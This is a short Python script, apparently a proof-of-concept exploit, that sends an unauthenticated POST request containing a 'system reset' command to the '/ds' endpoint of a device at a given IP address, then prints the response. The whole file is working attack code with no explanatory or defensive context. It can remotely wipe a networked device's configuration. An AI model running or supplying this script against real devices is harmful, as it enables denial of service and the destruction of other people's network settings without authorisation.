import sys
import requests
if len(sys.argv) != 2:
    exit()
ip = sys.argv[1]
s = requests.Session()
data = "{\"system\":{\"reset\":null},\"method\":\"do\", \"cfgsync\":{\"get_config_info\":null}}"
response = s.post("http://%s/ds" %ip, data=data)
print("Status code:   %i" % response.status_code)
print("Response body: %s" % response.content)